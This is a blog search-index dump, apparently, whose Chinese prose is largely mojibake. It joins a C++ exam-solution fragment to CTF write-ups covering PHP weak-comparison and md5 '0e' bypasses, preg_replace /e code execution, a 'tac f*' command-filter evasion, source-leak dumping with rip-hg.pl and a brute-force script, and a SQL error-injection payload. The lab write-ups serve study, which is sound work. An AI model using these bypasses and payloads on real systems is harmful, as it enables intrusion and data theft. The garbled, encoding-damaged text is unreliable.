t=100.0*(n+m-2*maxn)+sqrt(2)*100.0*maxn; cout\u0026lt;\u0026lt;(int)(t+0.5)\u0026lt;\u0026lt;endl; } return 0; } ","description":"","id":36,"section":"posts","tags":["è¯¾ç¨‹"],"title":"2020æµ™æ±Ÿç†å·¥å¤§å­¦ç®—æ³•è‰ºæœ¯ä¸ä¿¡æ¯å­¦å¥¥èµ›é€‰ä¿®è¯¾æœŸæœ«è€ƒè¯•","uri":"https://ruokeqx.gitee.io/posts/2020_zstu_algorithm_optional_class/"},{"content":"%0aç»•è¿‡ 1 2 3 4 5 6 if($_GET[\u0026#39;num\u0026#39;] !== \u0026#39;23333\u0026#39; \u0026amp;\u0026amp; preg_match(\u0026#39;/^23333$/\u0026#39;, $_GET[\u0026#39;num\u0026#39;])){ echo \u0026#39;1st ok\u0026#39;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else{ die(\u0026#39;23333333\u0026#39;); } %0Aç»•è¿‡(%0Aç»URLç¼–ç åæ˜¯å›è½¦)\ntac 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $query = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if (strlen($cmd) \u0026gt; 8){ die(\u0026#34;too long :(\u0026#34;); } if( substr_count($query, \u0026#39;_\u0026#39;) === 0 \u0026amp;\u0026amp; substr_count($query, \u0026#39;%5f\u0026#39;) === 0 ){ $arr = explode(\u0026#39; \u0026#39;, $cmd); if($arr[0] !== \u0026#39;ls\u0026#39; || $arr[0] !== \u0026#39;pwd\u0026#39;){ if(substr_count($cmd, \u0026#39;cat\u0026#39;) === 0){ system($cmd); } else{ die(\u0026#39;ban cat :) \u0026#39;); } } else{ die(\u0026#39;bad guy!\u0026#39;); } } else{ die(\u0026#39;nonono _ is bad\u0026#39;); } ç¦ç”¨cat ls pwd\nsystem(tac f*)\nlinux tacå‘½ä»¤\nè¿™é‡Œç›¸å½“äºsystem(tac f*)\næ­¤é¢˜system(tac fl*)ä¹Ÿå¯ä»¥\nMD5ç»•è¿‡ 0eç»•è¿‡ ç»ƒä¹ åœ°å€\nhttp://chinalover.sinaapp.com/web17/index.php?a=s1885207154a\u0026amp;b=s1836677006a\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php if (isset($_GET[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;b\u0026#39;])) { $a = $_GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if ($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)) { echo \u0026#34;flag{XXXXX}\u0026#34;; } else { echo \u0026#34;wrong!\u0026#34;; } } else { echo \u0026#39;wrong!\u0026#39;; } ?\u0026gt; ä¸Šé¢åªè¦ä¼ å…¥å‚æ•°a=s1885207154aï¼Œb=s1836677006aï¼Œå³å¯ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿçœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²çš„md5å€¼å¯ä»¥è¿”ç°åˆ†åˆ«å¦‚ä¸‹ï¼š\n1 2 3 MD5å€¼ md5(\u0026#34;s1885207154a\u0026#34;) =\u0026gt; 0e509367213418206700842008763514 md5(\u0026#34;s1836677006a\u0026#34;) =\u0026gt; 0e481036490867661113260034900752 äºŒè€…éƒ½æ˜¯0eå¼€å¤´ï¼Œåœ¨phpä¸­0eä¼šè¢«å½“åšç§‘å­¦è®¡æ•°æ³•ï¼Œå°±ç®—åé¢æœ‰å­—æ¯ï¼Œå…¶ç»“æœä¹Ÿæ˜¯0ï¼Œæ‰€ä»¥ä¸Šé¢çš„ifåˆ¤æ–­ç»“æœä½¿trueï¼ŒæˆåŠŸç»•è¿‡\npreg_replaceå‡½æ•° é¢˜ç›®(xctf ics-05)(æ”»é˜²ä¸–ç•Œæœ‰å¤ç°)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php //æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯• if ($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;] === \u0026#39;127.0.0.1\u0026#39;) { echo \u0026#34;\u0026lt;br \u0026gt;Welcome My Admin ! \u0026lt;br \u0026gt;\u0026#34;; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) \u0026amp;\u0026amp; isset($replacement) \u0026amp;\u0026amp; isset($subject)) { preg_replace($pattern, $replacement, $subject); }else{ die(); } } ?\u0026gt; å‡½æ•°ä½œç”¨ï¼šæœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œ ä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚\r$pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚\r$replacement: ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚\r$subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚\rpreg_replaceå‡½æ•°å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´\ræ­¤å¤„æ˜æ˜¾è€ƒå¯Ÿçš„æ˜¯preg_replace å‡½æ•°ä½¿ç”¨ /eæ¨¡å¼ï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œçš„é—®é¢˜ã€‚\nå‚è€ƒ[https://www.cnblogs.com/dhsx/p/4991983.html]\n/e ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç ï¼ˆåœ¨é€‚å½“çš„é€†å‘å¼•ç”¨æ›¿æ¢å®Œä¹‹åï¼‰ã€‚æç¤ºï¼šè¦ç¡®ä¿ replacement æ„æˆä¸€ä¸ªåˆæ³•çš„ PHP ä»£ç å­—ç¬¦ä¸²ï¼Œå¦åˆ™ PHP ä¼šåœ¨æŠ¥å‘Šåœ¨åŒ…å« preg_replace() çš„è¡Œä¸­å‡ºç°è¯­æ³•è§£æé”™è¯¯ã€‚\nä¹Ÿå°±æ˜¯è¯´ï¼Œpatå’Œsubæœ‰ç›¸åŒéƒ¨åˆ†ï¼Œrepçš„ä»£ç å°±ä¼šæ‰§è¡Œã€‚\næ ¹æ®æºç åˆ†æX-Forwarded-Foræ”¹æˆ127.0.0.1ä¹‹åï¼ŒGETè¿›ä¸‰ä¸ªå‚æ•°ã€‚ç„¶åè°ƒç”¨äº†preg_replaceå‡½æ•°ã€‚å¹¶ä¸”æ²¡æœ‰å¯¹patè¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥ä¼ å…¥\u0026quot;/e\u0026quot;è§¦å‘æ¼æ´\næœ€ç»ˆç»“æœ\nextractå˜é‡è¦†ç›– 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php $flag=\u0026#39;xxx\u0026#39;; extract($_GET); if(isset($shiyan)){ $content=trim(file_get_contents($flag)); if($shiyan==$content){ echo\u0026#39;flag{xxx}\u0026#39;; }else{ echo\u0026#39;Oh.no\u0026#39;; } } ä»£ç å¤§æ¦‚çš„æ„æ€æ˜¯å¯ä»¥ä»getè·å¾—çš„å‚æ•°ï¼Œè®¾ç½®å…¥GETè¶…å…¨å±€æ•°ç»„é‡Œé¢ï¼Œå¹¶ä¸”è¦†ç›–ä¹‹å‰çš„å˜é‡\nè¿™æ ·å­åªéœ€è¦é‡æ–°è®¾ç½®$shiyan å’Œ $contentï¼Œç»•è¿‡ifçš„æ£€æµ‹å°±å¯ä»¥äº†\nstrcmpæ¯”è¾ƒå­—ç¬¦ä¸² 1 2 3 4 5 6 7 8 9 \u0026lt;?php $flag = \u0026#34;flag{xxxxx}\u0026#34;; if (isset($_GET[\u0026#39;a\u0026#39;])) { if (strcmp($_GET[\u0026#39;a\u0026#39;], $flag) == 0) //å¦‚æœ str1 å°äº str2 è¿”å› \u0026lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› \u0026gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚ //æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ die(\u0026#39;Flag: \u0026#39;.$flag); else print \u0026#39;No\u0026#39;; } ä¼ æ•°ç»„\nurläºŒæ¬¡ç¼–ç ç»•è¿‡ 1 2 3 4 5 6 7 8 9 10 \u0026lt;?php if(eregi(\u0026#34;hackerDJ\u0026#34;,$_GET[id])) { echo(\u0026#34;not allowed!\u0026#34;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \u0026#34;hackerDJ\u0026#34;){ echo \u0026#34;Access granted!\u0026#34;; echo \u0026#34;flag\u0026#34;; } ergei()\tå‡½æ•°æ­£åˆ™åŒ¹é… ç­‰äºerge()å‡½æ•° åªæ˜¯åŒ¹é…çš„æ—¶å€™å¿½ç•¥å¤§å°å†™ éœ€è¦åŒ¹é… hackerDJ åªè¦åœ¨ä»–urlç¼–ç åä»»æ„ä¸€ä¸ªç¼–ç å‰åŠ ä¸Š25å°±è¡Œ %25 urlè§£ç åæ˜¯ %\nmd5å‡½æ•° 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php error_reporting(0); $flag = \u0026#39;flag{test}\u0026#39;; if (isset($_GET[\u0026#39;username\u0026#39;]) and isset($_GET[\u0026#39;password\u0026#39;])) { if ($_GET[\u0026#39;username\u0026#39;] == $_GET[\u0026#39;password\u0026#39;]) print \u0026#39;Your password can not be your username.\u0026#39;; else if (md5($_GET[\u0026#39;username\u0026#39;]) === md5($_GET[\u0026#39;password\u0026#39;])) die(\u0026#39;Flag: \u0026#39;.$flag); else print \u0026#39;Invalid password\u0026#39;; } 0eç»•è¿‡å¥½åƒæ²¡ç”¨ ç›´æ¥æ•°ç»„ç»•è¿‡\næ•°ç»„è¿”å›NULLç»•è¿‡ 1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $flag = \u0026#34;flag\u0026#34;; if (isset ($_GET[\u0026#39;password\u0026#39;])) { if (ereg (\u0026#34;^[a-zA-Z0-9]+$\u0026#34;, $_GET[\u0026#39;password\u0026#39;]) === FALSE) echo \u0026#39;You password must be alphanumeric\u0026#39;; else if (strpos ($_GET[\u0026#39;password\u0026#39;], \u0026#39;--\u0026#39;) !== FALSE) die(\u0026#39;Flag: \u0026#39; . $flag); else echo \u0026#39;Invalid password\u0026#39;; } å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡ 1 2 3 4 5 \u0026lt;?php $temp = $_GET[\u0026#39;password\u0026#39;]; is_numeric($temp)?die(\u0026#34;no numeric\u0026#34;):NULL; if($temp\u0026gt;1336) echo $flag; ç§‘å­¦è®¡æ•°æ³• ä¹Ÿå¯ä»¥ä¼ æ•°ç»„\nsha()å‡½æ•°æ¯”è¾ƒç»•è¿‡ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php $flag = \u0026#34;flag\u0026#34;; if (isset($_GET[\u0026#39;name\u0026#39;]) and isset($_GET[\u0026#39;password\u0026#39;])){ var_dump($_GET[\u0026#39;name\u0026#39;]); echo \u0026#34;\u0026#34;; var_dump($_GET[\u0026#39;password\u0026#39;]); var_dump(sha1($_GET[\u0026#39;name\u0026#39;])); var_dump(sha1($_GET[\u0026#39;password\u0026#39;])); if ($_GET[\u0026#39;name\u0026#39;] == $_GET[\u0026#39;password\u0026#39;]) echo \u0026#39;Your password can not be your name!\u0026#39;; else if (sha1($_GET[\u0026#39;name\u0026#39;]) === sha1($_GET[\u0026#39;password\u0026#39;])) die(\u0026#39;Flag: \u0026#39;.$flag); else echo \u0026#39;Invalid password.\u0026#39;; }else{ echo \u0026#39;Login first!\u0026#39;; } var_dump()\tæ‰“å°å˜é‡ç›¸å…³ä¿¡æ¯ sha1()\tè®¡ç®—å­—ç¬¦ä¸²çš„ sha1 æ•£åˆ—å€¼ æ•°ç»„ç»•è¿‡\nmd5åŠ å¯†ç›¸ç­‰ç»•è¿‡ 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $md51 = md5(\u0026#39;QNKCDZO\u0026#39;); $a = @$_GET[\u0026#39;a\u0026#39;]; $md52 = @md5($a); if(isset($a)){ if ($a != \u0026#39;QNKCDZO\u0026#39; \u0026amp;\u0026amp; $md51 == $md52) { echo \u0026#34;flag{*}\u0026#34;; } else { echo \u0026#34;false!!!\u0026#34;; } }else{ echo \u0026#34;please input a\u0026#34;; } è™½ç„¶è¯´ä¸ç”¨çœ‹ä¹ŸçŸ¥é“ä¸€å®šæ˜¯0eç»•è¿‡ã€‚ã€‚ã€‚ã€‚\nåå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php error_reporting(0); function noother_says_correct($temp) { $flag = \u0026#39;flag{test}\u0026#39;; $one = ord(\u0026#39;1\u0026#39;); //ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼ $nine = ord(\u0026#39;9\u0026#39;); //ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼ $number = \u0026#39;3735929054\u0026#39;; // Check all the input characters! for ($i = 0; $i \u0026lt; strlen($number); $i++){ // Disallow all the digits! $digit = ord($temp{$i}); if ( ($digit \u0026gt;= $one) \u0026amp;\u0026amp; ($digit \u0026lt;= $nine) ){ // Aha, digit not allowed! return \u0026#34;flase\u0026#34;; } } if($number == $temp) return $flag; } $temp = $_GET[\u0026#39;password\u0026#39;]; echo noother_says_correct($temp); å˜é‡è¦†ç›–(å¹³å°æŒ‚æ‰äº†) eregæ­£åˆ™%00æˆªæ–­ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php $flag = \u0026#34;xxx\u0026#34;; if (isset ($_GET[\u0026#39;password\u0026#39;])){ if (ereg (\u0026#34;^[a-zA-Z0-9]+$\u0026#34;, $_GET[\u0026#39;password\u0026#39;]) === FALSE){ echo \u0026#39;You password must be alphanumeric\u0026#39;; }else if (strlen($_GET[\u0026#39;password\u0026#39;]) \u0026lt; 8 \u0026amp;\u0026amp; $_GET[\u0026#39;password\u0026#39;] \u0026gt; 9999999){ if (strpos ($_GET[\u0026#39;password\u0026#39;], \u0026#39;-\u0026#39;) !== FALSE){ //strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½® die(\u0026#39;Flag: \u0026#39; . $flag); }else{ echo(\u0026#39;- have not been found\u0026#39;); } }else{ echo \u0026#39;Invalid password\u0026#39;; } } æ³•1.phpå¯¹å­—ç¬¦ä¸²æ˜¯æ•°å­—çš„éƒ¨åˆ†è¿›è¡Œæˆªå–è¿›è¡Œåˆ¤æ–­ è¿˜æœ‰å°±æ˜¯ erge %00æˆªæ–­åŒ¹é…äº†\næ³•2.æ•°ç»„è¿”å› null null !== false\nstrposæ•°ç»„ç»•è¿‡ 1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $flag = \u0026#34;flag\u0026#34;; if (isset ($_GET[\u0026#39;ctf\u0026#39;])) { if (@ereg (\u0026#34;^[1-9]+$\u0026#34;, $_GET[\u0026#39;ctf\u0026#39;]) === FALSE) echo \u0026#39;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ\u0026#39;; else if (strpos ($_GET[\u0026#39;ctf\u0026#39;], \u0026#39;#biubiubiu\u0026#39;) !== FALSE) die(\u0026#39;Flag: \u0026#39;.$flag); else echo \u0026#39;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~\u0026#39;; } è·Ÿä¸Šä¸€é¢˜ä¸€æ · æ²¡ä»€ä¹ˆå¥½è§£é‡Š\næ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php error_reporting(0); $flag = \u0026#39;flag{test}\u0026#39;; if (\u0026#34;POST\u0026#34; == $_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;]){ $password = $_POST[\u0026#39;password\u0026#39;]; if (0 \u0026gt;= preg_match(\u0026#39;/^[[:graph:]]{12,}$/\u0026#39;, $password)){ //preg_match â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é… echo \u0026#39;flag\u0026#39;; exit; } while (TRUE){ $reg = \u0026#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/\u0026#39;; if (6 \u0026gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(\u0026#39;punct\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;lower\u0026#39;); //[[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:digit:]] ä»»ä½•æ•°å­— [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯ [[:lower:]] ä»»ä½•å°å†™å­—æ¯ foreach ($ps as $pt){ if (preg_match(\u0026#34;/[[:$pt:]]+/\u0026#34;, $password)) $c += 1; } if ($c \u0026lt; 3) break;\t//\u0026gt;=3ï¼Œå¿…é¡»åŒ…å«å››ç§ç±»å‹ä¸‰ç§ä¸ä¸‰ç§ä»¥ä¸Š if (\u0026#34;42\u0026#34; == $password) echo $flag; else echo \u0026#39;Wrong password\u0026#39;; exit; } } è¦é•¿åº¦è¶…è¿‡12å­—æ¯ç¬¦å·æ•°å­—å¤§å°å†™è¶…è¿‡ä¸‰ç§ ä½†æ˜¯å®é™…æµ‹è¯•ç¬¦åˆæ¡ä»¶çš„éƒ½ä¸è¡Œ ä¸ç¬¦åˆæ¡ä»¶çš„å°±ç›´æ¥å‡ºflag ä¸æ‡‚ä¸æ‡‚ã€‚ã€‚ã€‚ã€‚ã€‚\nç½‘ä¸Šç‰ˆæœ¬éƒ½æ˜¯ç›´æ¥postç©ºå€¼å°±è¡Œ åº”è¯¥æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜ï¼Ÿé¢˜ç›®æœ¬æ„åº”è¯¥ä¸æ˜¯è¿™ä¸ªï¼Ÿ\nç®€å•çš„waf(é¶æœºæŒ‚äº†) ","description":"","id":37,"section":"posts","tags":["CTF"],"title":"bugkuä»£ç å®¡è®¡","uri":"https://ruokeqx.gitee.io/posts/code_auditing/"},{"content":"ä¿¡æ¯æ³„éœ² ç›®å½•å†é ç›´æ¥æ‰¾å°±è¡Œã€‚ã€‚ã€‚\nPHPINFO è¿›å»ç›´æ¥ ctrl+f æœflagå°±è¡Œã€‚ã€‚ã€‚\nå¤‡ä»½æ–‡ä»¶ä¸‹è½½ ç½‘ç«™æºç  æç¤ºä¸€äº›ç›¸å…³çš„åå­—\nå¯ä»¥å†™ä¸ªç®€å•çš„è„šæœ¬çˆ†ç ´ä¸€ä¸‹ å½“ç„¶ä¹Ÿå¯ä»¥ dirsearch ç›´æ¥æ‰«\n1 2 3 4 5 6 7 8 9 10 11 12 import requests url = \u0026#34;http://challenge-c93f188d4781b829.sandbox.ctfhub.com:10080/\u0026#34; a = [\u0026#39;web\u0026#39;,\u0026#39;website\u0026#39;,\u0026#39;backup\u0026#39;,\u0026#39;back\u0026#39;,\u0026#39;www\u0026#39;,\u0026#39;wwwroot\u0026#39;,\u0026#39;temp\u0026#39;] b = [\u0026#39;tar\u0026#39;,\u0026#39;tar.gz\u0026#39;,\u0026#39;zip\u0026#39;,\u0026#39;rar\u0026#39;] for i in a: for j in b: pos = url + i + \u0026#39;.\u0026#39; + j r = requests.get(pos) print(i) print(j) print(r) è·å¾—æºç è§£å‹åæœ‰ä¸ª flag.txt ä½†æ˜¯é‡Œé¢ä¸æ˜¯flag è¿˜æœ‰ä¸ªå¥‡æ€ªçš„ 50x.html å°è¯•ç›´æ¥è®¿é—®è¿™ä¸ªå¥‡æ€ªçš„ html æ²¡ç”¨ ç›´æ¥è®¿é—®è¿™ä¸ª flag.txt å°±å‡ºäº†\nbakæ–‡ä»¶ çœ‹åˆ°é¢˜ç›®å°±ä¸‹æ„è¯† å¤‡ä»½æ–‡ä»¶åç¼€æ˜¯ .bak ï¼ˆlinuxå‘½åçš„ä¹ æƒ¯ï¼‰\næ‰“å¼€ç½‘é¡µ æç¤ºflagåœ¨ flag.php é‡Œ åŠ ä¸Šåç¼€ down ä¸‹æ–‡ä»¶ flagå°±åœ¨é‡Œé¢\nvimç¼“å­˜ åˆæ˜¯è€ƒå¸¸è¯†å§ linuxä¸‹vimçš„ç¼“å­˜æ–‡ä»¶åç¼€æ˜¯ .tmp è€Œä¸”æ˜¯éšè—æ–‡ä»¶ æœ‰ä¸ª . çš„å‰ç¼€\næŠŠä¸‹ä¸‹æ¥çš„æ–‡ä»¶æ”¾ linux è¯»ç¼“å­˜å°±è¡Œäº†\n.DS_Store .DS_Store æ˜¯macosç³»ç»Ÿä¸‹çš„åŒ…å«æ–‡ä»¶ç›®å½•çš„æ–‡ä»¶\nä¸‹è½½æ–‡ä»¶å¹¶ç”¨è„šæœ¬åˆ†æ ç„¶ååˆ°é¶æœºæ‰“å¼€è¿™ä¸ªç›®å½•å°±è¡Œ\nGitæ³„éœ² çœŸçš„ä¸çŸ¥é“ä¸ºä»€ä¹ˆ ä¸ç®¡æ˜¯ win è¿˜æ˜¯ linux éƒ½æ²¡ååº” é‡è£…äº†ä¹Ÿä¸è¡Œ\nGithack ä¸èƒ½ç”¨çš„é—®é¢˜è§£å†³äº† æ˜¯è„šæœ¬çš„é—®é¢˜ è¿™é‡Œæ„Ÿè°¢ä¸€ä¸‹è¯„è®ºåŒºçš„å¸ˆå‚…\näº²æµ‹å¯ç”¨çš„ Githacké“¾æ¥ï¼š https://github.com/BugScanTeam/GitHack\nLog ç›¸å¯¹ç®€å•çš„ä¸€é¢˜ çŸ¥è¯†ç‚¹ï¼š\ngit logå¯ä»¥æŸ¥çœ‹æ—¥å¿— å°±æ˜¯çœ‹çœ‹å†å²ç‰ˆæœ¬ä¸­éƒ½å¹²äº†äº›ä»€ä¹ˆ git reset \u0026ndash;hard ç‰ˆæœ¬å· å°±å¯ä»¥å›åˆ°æŒ‡å®šçš„ç‰ˆæœ¬ git reset --hard xxxxxxxxxxxxxxx Stash åšè¿™é¢˜ä¹‹å‰ éœ€è¦çŸ¥é“ stash æ˜¯ä»€ä¹ˆä¸œè¥¿\ngit stashæ˜¯gitä¸€ä¸ªå¾ˆæœ‰ç”¨çš„å‘½ä»¤ï¼Œå®ƒçš„ä½œç”¨æ˜¯æŠŠå½“å‰æœªæäº¤çš„ä¿®æ”¹æš‚å­˜èµ·æ¥ï¼Œè®©ä»“åº“è¿˜åŸåˆ°æœ€åä¸€æ¬¡æäº¤çš„çŠ¶æ€ã€‚å¸¸ç”¨äºæ›´æ–°ã€åŒæ­¥ä»£ç æˆ–è€…ä¿å­˜å¤šä¸ªä¿®æ”¹ç‰ˆæœ¬ç­‰æƒ…å†µä¸‹ã€‚\nä¸ªäººæ„Ÿè§‰è¿™ç¯‡ç™¾åº¦ç»éªŒå†™çš„ç²¾ç®€æ˜äº†\ngit stash\t# git stashå‘½ä»¤ä¼šå°†ä»“åº“ä¸­çš„ä¿®æ”¹ä¿å­˜ï¼Œå»ºç«‹ä¸€æ¡stashä¿¡æ¯ï¼Œé»˜è®¤çš„è¯´æ˜ä¿¡æ¯æ˜¯æœ€åä¸€æ¬¡æäº¤çš„èŠ‚ç‚¹å·å’Œæäº¤è¯´æ˜ã€‚\rgit stash save #â€˜è¯´æ˜ä¿¡æ¯â€™ä¸1çš„æ•ˆæœä¸€æ ·ï¼Œè¯´æ˜ä¿¡æ¯æ˜¯æŒ‡å®šçš„å†…å®¹ï¼Œæ›´åŠ åˆ©äºäº†è§£stashçš„å†…å®¹ã€‚\rgit stash list #åˆ—å‡ºå½“å‰ä»“åº“ä¸‹æ‰€æœ‰çš„stashæ¡ç›®ï¼Œæ¯ä¸€æ¡stashç”¨stash@{n}æ ‡è¯†ã€‚\rgit stash pop [stash] # å°†stashçš„å†…å®¹å¼¹å‡ºï¼Œé»˜è®¤å¼¹å‡ºæœ€ä¸Šé¢çš„é‚£æ¡ï¼Œå³stash@{0}ã€‚æ­¤å¤–è¿˜å¯ä»¥åœ¨popååŠ stash@{n}æ¥æŒ‡å®šè¦å¼¹å‡ºçš„stashæ¡ç›®ã€‚\rgit stash drop [stash] #ä¸¢å¼ƒstashæ¡ç›®ï¼Œé»˜è®¤ä¸¢å¼ƒæœ€ä¸Šé¢çš„é‚£æ¡ï¼Œå³stash@{0}ï¼Œæ­¤å¤–è¿˜å¯ä»¥åœ¨dropååŠ stash@{n}æ¥æŒ‡å®šè¦ä¸¢å¼ƒçš„stashæ¡ç›®ã€‚\rgit stash clear #æ¸…é™¤æ‰€æœ‰çš„stashæ¡ç›®ã€‚\rgit show stash@{n}\t#å½“æœ‰å¤šæ¡è®°å½•å¹¶ä¸”è¿‡äº†ä¸€æ®µæ—¶é—´å¿˜è®°stashå†…å®¹æ—¶é€šè¿‡è¯¥å‘½ä»¤å¯ä»¥æŸ¥çœ‹stashçš„å…·ä½“å†…å®¹ Index ??? è¿™é¢˜ç®€å•åœ°ç¦»è°±ã€‚ã€‚ã€‚flagå°±åœ¨å½“å‰ç›®å½•ä¸‹ ã€‚ã€‚ã€‚æˆ‘è¿˜ä»¥ä¸ºæ˜¯å‡çš„å‘¢ é‚£ä¹ˆä¸ºå•¥ä»–æ˜¯ç¬¬ä¸‰é¢˜ã€‚ã€‚ã€‚ã€‚\nSVNæ³„éœ² ä½¿ç”¨ dvcs-ripper å·¥å…·ä¸­çš„ rip-svn.pl è„šæœ¬\nè„šæœ¬ä½¿ç”¨è¿‡ç¨‹å¯èƒ½ä¼šé‡åˆ°ä¸‹é¢ç±»ä¼¼çš„å¾ˆé•¿çš„æŠ¥é”™\ninstall_driver(SQLite) failed: Canâ€™t locate DBD/SQLite.pm\nè§£å†³æ–¹æ³• å¼ºçƒˆå»ºè®®å¼€é¶æœºå‰è§£å†³è¿™ä¸ªé—®é¢˜ ä¸ç„¶å¾ˆå¯èƒ½éœ€è¦å¤šèŠ±é‡‘å¸ç»­è´¹é¶æœº\nHGæ³„éœ² è¿˜æ˜¯ä¸Šä¸€ä¸ªè„šæœ¬åº“é‡Œçš„ rip-hg.pl\n1 2 #ä¸€å®šè¦åŠ  -v ä¸ç„¶ down ä¸ä¸‹æ¥çš„ ./rip-hg.pl -v -u http://challenge-365f72206c2c35b5.sandbox.ctfhub.com:10080/.hg/ ç„¶åå°±æ˜¯æ–‡ä»¶å¤¹é‡Œä¸€é¡¿ç–¯æ‰¾ ä½†æ˜¯ä»€ä¹ˆéƒ½æ‰¾ä¸åˆ° ä½†æ˜¯å¾ˆå¤šä¸ªæ–‡ä»¶ é‡Œé¢éƒ½æœ‰å…³äº flag.txt çš„\nçœ‹åˆ°è¿™ä¸ªå°±å¾ˆæ¸…æ¥šäº† ç›´æ¥è®¿é—®è¿™ä¸ª flag.txt\nå¯†ç å£ä»¤ å¼±å£ä»¤ ç¬¬ä¸€æ¬¡å¼€é¶æœºçœŸçš„æ²¡æœ‰çˆ†å‡ºæ¥ çœŸçš„éƒé—· å¯†ç æ˜¯éšæœºçš„\né»˜è®¤å£ä»¤ æ²¡æœ‰ç”¨æˆ·åä¼šæé†’æ²¡æœ‰ç”¨æˆ·å ç­›é€‰ç”¨æˆ·å é€‰æ‹©å¯¹åº”å£ä»¤å°±å¯ä»¥\nSQLæ³¨å…¥ SQL æ•´æ•°å‹æ³¨å…¥ idä»3å¼€å§‹å°±æ²¡æœ‰å›æ˜¾ å¯ä»¥åœ¨3ä»¥åçš„æ•°æ³¨\næ³¨å¾—æ•°æ®åº“ç»“æ„å¦‚ä¸‹\nsqli news id\t//1,2,114514 data\t//ctfhub,skill,sqli flag flag SQLå­—ç¬¦å‹æ³¨å…¥ æ•°æ®åº“è¿˜æ˜¯è·Ÿä¸Šä¸€é¢˜ä¸€æ · å°±æ˜¯æœç´¢æ–¹å¼ ä»æ•°å­—å˜æˆå­—ç¬¦ é—­åˆä¸€ä¸‹å‰é¢çš„å¼•å·å°±å¯ä»¥äº† æœ¬é¢˜ä¸å†èµ˜è¿°\nç†è®ºä¸Šæ¥è¯´ä½ å¯ä»¥ç›´æ¥æ³¨ flag è¡¨é‡Œçš„ flag å­—æ®µ(æˆ‘å°±æ˜¯è¿™ä¹ˆåšçš„ å¤ªæ‡’äº†)\nSQLæŠ¥é”™æ³¨å…¥ updatexml æœ€é•¿æ˜¾ç¤º32ä½æ•° è¿™é¢˜ä¸èƒ½ç”¨\nä½¿ç”¨\n1 1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x; æ—¶é—´ç›²æ³¨ å­¦ä¹ çš„è¯å¯ä»¥å‚è€ƒè¿™ä¸ª\né¶æœºç»­è´¹äº†ä¸¤æ¬¡ äºæ­»äº† ä¸‹é¢è¿™ä¸ªå›¾é‡Œè·‘å‡ºæ¥çš„flagæ˜¯é”™çš„ QWQ æœ€åå¼€ç¬¬äºŒéè·‘å‡ºæ¥äº†\nå…ˆæ‰‹æµ‹ä¸€ä¸‹ æ•°æ®åº“ 